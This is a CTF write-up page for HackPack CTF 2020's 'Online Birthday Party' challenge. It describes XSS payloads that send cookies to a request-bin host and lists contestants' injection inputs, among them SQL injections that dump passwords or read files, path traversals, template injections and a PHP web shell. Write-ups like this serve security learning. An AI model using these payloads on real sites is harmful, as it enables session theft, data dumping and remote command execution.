@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>HackPack CTF 2020: Online Birthday Party - Team Steam Stream</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<meta property="og:title" content="HackPack CTF 2020: Online Birthday Party" />
+<meta property="og:description" content="Crowdsourcing a CTF Challenge
+
+This pandemic hit everybody hard. Especially, those who want to make a
+birthday party. That is why we decided to create a website where you
+can find those who have the same birthdate as yours. Check it out:
+https://online-birthday-party.cha.hackpack.club/
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://teamsteamstream.github.io/writeups/hackpack20/onlinebirthdayparty/" />
+<meta property="article:published_time" content="2020-05-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-05-18T00:00:00+00:00" />
+
+	
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+	<link rel="stylesheet" href="/css/style.css">
+	
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container">
+		<div class="logo">
+			<a class="logo__link" href="/" title="Team Steam Stream" rel="home">
+				<div class="logo__title">Team Steam Stream</div>
+				<div class="logo__tagline">A CTF team at Uppsala University</div>
+			</a>
+		</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">HackPack CTF 2020: Online Birthday Party</h1>
+			<div class="post__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg>
+	<time class="meta__text" datetime="2020-05-18T00:00:00">2020-05-18</time>
+</div>
+
+<div class="meta__item-categories meta__item">
+	<svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
+	<span class="meta__text"><a class="meta__link" href="/categories/writeups/" rel="category">writeups</a>
+	</span>
+</div></div>
+		</header><div class="content post__content clearfix">
+			<h2 id="crowdsourcing-a-ctf-challenge">Crowdsourcing a CTF Challenge</h2>
+<blockquote>
+<p>This pandemic hit everybody hard. Especially, those who want to make a
+birthday party. That is why we decided to create a website where you
+can find those who have the same birthdate as yours. Check it out:
+<a href="https://online-birthday-party.cha.hackpack.club/">https://online-birthday-party.cha.hackpack.club/</a></p>
+</blockquote>
+<p>I noticed straight away that the username wasn't sanitised, so I figured
+this was an XSS challenge. I set up a request bin in preparation for
+snooping some cookies, and then tried to register with the neat
+cross-origin image exfiltration technique</p>
+<pre><code class="language-{.html}" data-lang="{.html}">&lt;script&gt;document.write('&lt;img src=&quot;https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie+'&quot;&gt;')&lt;/script&gt;
+</code></pre><p>but the website complained it was too long so I had to settle instead
+for the much more brutish relocation technique:</p>
+<pre><code class="language-{.html}" data-lang="{.html}">&lt;script&gt;document.location='https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie&lt;/script&gt;
+</code></pre><p>Then I waited, and waited some more. After a long while, and having more
+or less given up on the approach, I finally got a hit. I copied the
+cookie and reloaded the page:</p>
+<blockquote>
+<p>Hello, blacknote10!</p>
+<p>Your birthday: 0&rsquo; OR 1=1 #&ndash;</p>
+</blockquote>
+<p>Hello blacknote, indeed. This was not the automatic script I had
+expected, but another contestant. It now dawned on me that this
+challenge was not meant to be a JavaScript injection in the username,
+but a SQL injection in the birthday.</p>
+<p>blacknote had written an injection which let them list every account
+with their birthdays. Since my account was on the list, they had, for
+them I expect rather annoyingly, been redirected to my request bin.</p>
+<p>I could see blacknote evolve their injection in real time, but better
+yet I could copy their first injection to see everyones accounts. Here
+are some examples in no particular order:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Username</th>
+<th align="left">Birthday</th>
+<th align="center">Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>admin</code></td>
+<td align="left"><code>1/1/2001</code></td>
+<td align="center">The admin account. Note the different date format.</td>
+</tr>
+<tr>
+<td align="left"><code>x-1587597992</code></td>
+<td align="left"><code>2020-04-1</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>herve</code></td>
+<td align="left"><code>2020-04-24</code></td>
+<td align="center">Some normal looking stuff.</td>
+</tr>
+<tr>
+<td align="left"><code>abc</code></td>
+<td align="left"><code>214748-03-31</code></td>
+<td align="center">A strange year.</td>
+</tr>
+<tr>
+<td align="left"><code>test1</code></td>
+<td align="left"><code>'or'1'='1'--</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>asdf</code></td>
+<td align="left"><code>' UNION SELECT NULL</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>'</code></td>
+<td align="left"><code>' ON DUPLICATE KEY UPDATE password=&quot;asdf&quot; --</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>www</code></td>
+<td align="left"><code>2002-01-01' UNION SELECT * FROM </code> <code>information_schema.columns WHERE table_name = '%</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>k3</code></td>
+<td align="left"><code>2020-04-06 order by 10-- -</code></td>
+<td align="center">Heaps of SQL injections.</td>
+</tr>
+<tr>
+<td align="left"><code>{{config}}</code></td>
+<td align="left"><code>2000-01-01</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>{{ 7*7 }}</code></td>
+<td align="left"><code>1994-03-04</code></td>
+<td align="center">Template injections.</td>
+</tr>
+<tr>
+<td align="left"><code>whaaat</code></td>
+<td align="left"><code>1' OR password like 'flag{%</code></td>
+<td align="center">Interesting!</td>
+</tr>
+<tr>
+<td align="left"><code>c:/Windows/system.ini</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>..\..\..\..\..\..\..\..\..</code> <code>\..\..\..\..\..\..\..\Windows\system.ini</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>/etc/passwd</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center">Direct file traversals.</td>
+</tr>
+<tr>
+<td align="left"><code>p4</code></td>
+<td align="left"><code>' union SELECT load_file('/var/lib/mysql-files/flag.txt'),1;-- -</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>p6</code></td>
+<td align="left"><code>' union SELECT load_file(0x272f7661722f6c69622f6d79</code> <code>73716c2d66696c65732f666c61672e74787427),1;--</code></td>
+<td align="center">File traversal through SQL.</td>
+</tr>
+<tr>
+<td align="left"><code>flag</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center">Don't think that's going to work.</td>
+</tr>
+<tr>
+<td align="left"><code>thishouldnotexistandhopefullyitwillnot</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center">Alas, it does.</td>
+</tr>
+<tr>
+<td align="left"><code>http://www.google.com:80/search?q=OWASP%20ZAP</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center">Not sure what's going on here.</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;!--#EXEC cmd=&quot;ls /&quot;--&gt;</code></td>
+<td align="left"><code>2020-04-23</code></td>
+<td align="center">Some other form of injection.</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;b&gt;hi&lt;/b&gt;</code></td>
+<td align="left"><code>0000-01-01</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>ab</code></td>
+<td align="left"><code>&lt;u&gt;aa&lt;/u&gt;</code></td>
+<td align="center">HTML injections.</td>
+</tr>
+<tr>
+<td align="left"><code>ab1</code></td>
+<td align="left"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;script&gt;alert('yo');&lt;/script&gt;</code></td>
+<td align="left"><code>2020-04-27</code></td>
+<td align="center">Other peoples JavaScript injections.</td>
+</tr>
+<tr>
+<td align="left"><code>admin</code></td>
+<td align="left"><code>2020-04-08</code></td>
+<td align="center">Another admin account.</td>
+</tr>
+<tr>
+<td align="left"><code>herve2</code></td>
+<td align="left"><code>\\a\l\e\r\t\(\'\X\S\S\'\)\;\</code>                                                                    |                                                    |</td>
+<td></td>
+</tr>
+<tr>
+<td align="left"><code>herve3</code></td>
+<td align="left"><code>'\\U\N\I\O\N\A\L\L\S\E\L\E\C\T\*\F\R\O\M\u\s\e\r\s\'</code></td>
+<td align="center">Lots of leaning sticks.</td>
+</tr>
+<tr>
+<td align="left"><code>jHcY') AND 8400=7228 AND ('QIlv'='QIlv</code></td>
+<td align="left"><code>hpXo</code></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="left"><code>jHcY&quot;) AS jHgo WHERE 5594=5594 AND 5122=7506-- YpXl</code></td>
+<td align="left"><code>hpXo</code></td>
+<td align="center">A bunch of stuff like this.</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;script&gt;alert(10)&lt;/script&gt;</code></td>
+<td align="left"><code>1337-10-10</code></td>
+<td align="center">My first JavaScript injection.</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;script&gt;document.location='</code> <code>https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie&lt;/script&gt;</code></td>
+<td align="left"><code>1337-11-10</code></td>
+<td align="center">My second JavaScript injeciton.</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?&gt;</code></td>
+<td align="left"><code>2020-03-19</code></td>
+<td align="center">PHP injection.</td>
+</tr>
+<tr>
+<td align="left"><code>ab2</code></td>
+<td align="left"><code>whoami</code></td>
+<td align="center">Shell injection.</td>
+</tr>
+</tbody>
+</table>
+<p>Looking through these it was not too hard to figure out how to also dump the
+passwords – something like:</p>
+<pre><code>' UNION SELECT username, password FORM users WHERE '' = '
+</code></pre><p>So now, if I wanted to try something out, I didn't have to create an new
+account, but could simply log into the existing one instead. As an added
+bonus, the flag was found as the password for the admin account:</p>
+<pre><code>flag{c0mpl1cat3d_2nd_0rd3r_sql}
+</code></pre>
+		</div>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Lars Haulin</span>
+	</div>
+	<div class="authorbox__description">
+		Lars is an UU alumn, working as an IT-security specialist in Uppsala. He has been playing CTFs for over 10 year with the top ranked swedish team HackingForSoju.
+	</div>
+</div>
+
+<nav class="post-nav flex">
+	<div class="post-nav__item post-nav__item--prev">
+		<a class="post-nav__link" href="/writeups/hackpack20/timewindow/" rel="prev"><span class="post-nav__caption">«&thinsp;Previous</span><p class="post-nav__post-title">HackPack CTF 2020: Time Window</p></a>
+	</div>
+	<div class="post-nav__item post-nav__item--next">
+		<a class="post-nav__link" href="/writeups/hackpack20/hidinginplaintext/" rel="next"><span class="post-nav__caption">Next&thinsp;»</span><p class="post-nav__post-title">HackPack CTF 2020: Hiding in Plaintext</p></a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2020 Team Steam Stream.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
